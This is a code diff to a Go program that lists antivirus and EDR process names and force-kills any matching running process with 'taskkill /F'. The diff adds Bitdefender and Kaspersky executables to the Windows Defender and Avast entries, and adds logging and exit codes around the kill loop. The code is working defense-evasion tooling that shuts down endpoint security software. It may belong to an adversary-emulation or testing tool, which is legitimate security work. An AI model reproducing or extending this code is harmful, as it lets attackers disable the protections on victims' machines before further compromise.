@@ -14,7 +14,7 @@ type AVEDRExe struct {
 	exe  string
 }
 
-var WinAVEDRExecs = []AVEDRExe{AVEDRExe{"Windows Defender", "MsMpEng.exe"}, AVEDRExe{"Avast", "AvastUI.exe"}, AVEDRExe{"Avast", "AvastSvc.exe"}}
+var WinAVEDRExecs = []AVEDRExe{AVEDRExe{"Windows Defender", "MsMpEng.exe"}, AVEDRExe{"Avast", "AvastUI.exe"}, AVEDRExe{"Avast", "AvastSvc.exe"}, AVEDRExe{"Bitdefender", "btredline.exe"}, AVEDRExe{"Bitdefender", "btservicehost.exe"}, AVEDRExe{"Bitdefender", "btagent.exe"}, AVEDRExe{"Bitdefender", "btntwrk.exe"}, AVEDRExe{"Kaspersky", "avp.exe"}, AVEDRExe{"Kaspersky", "avpui.exe"}}
 var LinAVEDRExecs = []AVEDRExe{AVEDRExe{"ClamAV", "clam"}}
 
 func checkIfItIsAVEDR(name string) bool {
@@ -72,14 +72,17 @@ func main() {
 
 		for i := 0; i < len(AVEDRprocess); i++ {
 			stopAVEDR := exec.Command("taskkill", "/IM", AVEDRprocess[i], "/F")
-			_, err := stopAVEDR.Output()
+			out, err := stopAVEDR.Output()
 			if err != nil {
 				if err.Error() == "exit status 1" {
+					helpers.WriteLog(nameOfLogFile, string(out), 1)
 					os.Exit(1)
 				} else {
 					helpers.WriteLog(nameOfLogFile, err.Error(), 1)
 					os.Exit(3)
 				}
+			} else {
+				os.Exit(0)
 			}
 		}
 	} else {
